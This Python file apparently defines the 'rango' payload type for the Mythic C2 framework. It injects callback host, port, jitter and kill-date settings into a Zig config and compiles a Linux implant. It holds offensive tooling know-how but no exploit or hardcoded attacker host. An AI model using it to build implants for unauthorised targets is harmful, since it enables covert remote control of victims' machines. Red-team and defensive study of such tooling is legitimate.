import logging
import pathlib
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import tempfile
from distutils.dir_util import copy_tree
import asyncio
import os
import sys
import stat
import pathlib

class Rango(PayloadType):
    name = "rango"
    #file_extension = "exe"
    author = "@pop-ecx"
    supported_os = [SupportedOS.Linux]
    wrapper = False
    wrapped_payloads = []
    note = """Simple zig implant for Linux"""
    supports_dynamic_loading = False
    c2_profiles = ["http"]
    mythic_encrypts = False
    translation_container = "RangoTranslator" # "myPythonTranslation"
    build_parameters = [
        BuildParameter(
            name="out",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose out format",
            choices=["exe"],
            default_value="exe",
        )
    ]
    agent_path = pathlib.Path(".") / "rango"
    agent_icon_path = agent_path / "agent_functions" / "rango.png"
    agent_code_path = agent_path / "agent_code"

    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Generating configuration", step_description="Creating config.zig with agent settings"),
        BuildStep(step_name="Compiling", step_description="Compiling deez nuts in your face"),
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        config = {
            "payload_uuid": self.uuid,
            "callback_host": "",
            "headers": [],
            "USER_AGENT": "",
            #"httpMethod": "POST",
            "post_uri": "",
            "callback_port": 80,
            "ssl": False,
            "proxyEnabled": False,
            "proxy_host": "",
            "proxy_user": "",
            "proxy_pass": "",
            "callback_interval": 10,
            "callback_jitter": 0.1,
            "kill_date": "",
        }
        for c2 in self.c2info:
            profile = c2.get_c2profile()
            for key, val in c2.get_parameters_dict().items():
                config[key] = val
            break
        if "https://" in config["callback_host"]:
            config["ssl"] = True
            config["encrypted_exchange_check"] = True

        config["callback_host"] = config["callback_host"]
        headers = config.get("headers", {})
        if isinstance(headers, dict):
            for key, value in headers.items():
                if key.strip().lower() == "user-agent":
                    config["USER_AGENT"] = value.strip()
                    break

        if config["proxy_host"] != "":
            config["proxyEnabled"] = True

        # Payload creation
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
            PayloadUUID=self.uuid,
            StepName="Gathering Files",
            StepStdout="Found all files for payload",
            StepSuccess=True
        ))
        agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
        copy_tree(str(self.agent_code_path), agent_build_path.name)
        # A hacky way to replace placeholder values generated at runtime. There's probably a more ziggy way to do this.
        config_zig_content = f"""
const types = @import("types.zig");

pub const uuid: []const u8 = "{config['payload_uuid']}";
pub const payload_uuid: []const u8 = "{config['payload_uuid']}";
pub const agentConfig: types.AgentConfig = .{{
    .callback_host = "{config['callback_host']}",
    .callback_port = {config['callback_port']},
    .user_agent = "{config['USER_AGENT']}",
    .sleep_interval = {config['callback_interval']},
    .jitter = {config['callback_jitter']:.1f},
    .kill_date = {"null" if not config["kill_date"] else f'"{config["kill_date"]}"'},
}};
"""
        home = pathlib.Path.home()
        config_file_path = home / "Desktop" / "rango" / "Payload_Type" / "rango" / "rango" / "agent_code" / "src" / "config.zig"
        with open(config_file_path, "w") as f:
            f.write(config_zig_content)
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
            PayloadUUID=self.uuid,
            StepName="Generating configuration",
            StepStdout="Generated config.zig with agent settings",
            StepSuccess=True
        ))
        command = f"zig build -Dtarget=x86_64-linux-gnu --release=small"
        filename = str(self.agent_code_path / "zig-out" / "bin" / "rango")
        proc = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=str(self.agent_code_path)
        )
        stdout, stderr = await proc.communicate()

        if proc.returncode != 0:
            resp.status = BuildStatus.Error
            resp.build_stderr = stderr.decode()
            return resp

        os.chmod(filename, stat.S_IRWXU | stat.S_IRWXG | stat.S_IROTH | stat.S_IXOTH)  # rwxr-xr-x
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
            PayloadUUID=self.uuid,
            StepName="Compiling",
            StepStdout="Successfully compiled rango",
            StepSuccess=True
        ))
        resp.payload = open(filename, "rb").read()

        return resp
